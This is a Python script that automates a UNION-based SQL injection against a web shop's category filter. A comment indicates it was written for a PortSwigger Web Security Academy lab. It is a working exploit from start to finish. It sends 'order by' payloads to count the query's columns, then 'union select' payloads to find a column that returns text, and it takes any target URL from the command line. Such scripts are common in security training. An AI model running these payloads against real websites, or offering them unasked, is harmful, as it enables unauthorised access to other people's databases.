import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_column_number(url):
    path = "/filter?category=Gifts"
    for i in range(1, 50):
        sql_payload = f"'+order+by+{i}--"
        r = requests.get(url + path + sql_payload,
                         verify=False)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False


def exploit_sqli_string_field(url, num_col):
    path = "/filter?category=Gifts"
    for i in range(1, num_col+1):
        string = "'yndeY8'"
        payload_list = ['null'] * num_col
        print(payload_list)
        payload_list[i-1] = string
        print(payload_list)
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        print(sql_payload)
        r = requests.get(url + path + sql_payload,
                         verify=False)
        res = r.text
        if string.strip('\'') in res:
            return i
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print(f"[+] The number of columns is '{str(num_col)}'.")
        print("[+] Figuring out which column contains text...")
        string_column = exploit_sqli_string_field(url, num_col)
        if string_column:
            print(
                f"[+] The column that contains text is '{str(string_column)}'.")
        else:
            print("[-] We were not able to find a column that has a string data type.")
    else:
        print("[-] The SQLi attack was not successful.")

# bash command to trigger the attack: python3 sql-injection/test-04/test-04.py https://0a1300b0043fd70081a3521600330074.web-security-academy.net
# Note that the URL can be different and updates on daily basis by the PortSwigger
